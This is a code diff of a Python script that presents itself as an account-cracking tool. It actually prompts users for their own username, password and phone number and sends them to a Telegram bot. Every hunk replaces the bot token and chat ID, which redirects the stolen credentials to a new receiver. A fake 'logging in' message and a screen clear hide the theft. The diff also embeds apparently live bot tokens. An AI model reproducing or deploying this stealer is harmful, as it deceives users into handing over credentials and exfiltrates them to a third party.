@@ -38,7 +38,7 @@ if number == 1:
         print("\033[32mTool devoloped : Anonymous\033[0m")
 
         # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+        bot = telegram.Bot(token='5719232520:AAHlFHeueMdY38VWgxubUs64BhOM2FhQS2o')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
         print("")
@@ -100,7 +100,7 @@ elif number == 2:
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
+        await bot.send_message(chat_id=1932232428, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
@@ -118,7 +118,7 @@ elif number == 3:
         print("\033[32mTool devoloped : Anonymous\033[0m")
 
         # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+        bot = telegram.Bot(token='5719232520:AAHlFHeueMdY38VWgxubUs64BhOM2FhQS2o')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
         print("")
@@ -140,7 +140,7 @@ elif number == 3:
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
+        await bot.send_message(chat_id=1932232428, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
@@ -157,7 +157,7 @@ elif number == 4:
         print("\033[32mTool devoloped : Anonymous\033[0m")
 
         # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5971532047:AAExHdyy5Kbxcxh_GYPFNwXkPS9jv7wk9Hg')
+        bot = telegram.Bot(token='5719232520:AAHlFHeueMdY38VWgxubUs64BhOM2FhQS2o')
 
         print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
         print("")
@@ -179,7 +179,7 @@ elif number == 4:
         password = input('Enter your password: ')
 
         # Send the username and password to telegram
-        await bot.send_message(chat_id=1646830112, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
+        await bot.send_message(chat_id=1932232428, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
         print("Logging in to your account... please wait...")
         time.sleep(3)
         os.system("clear")
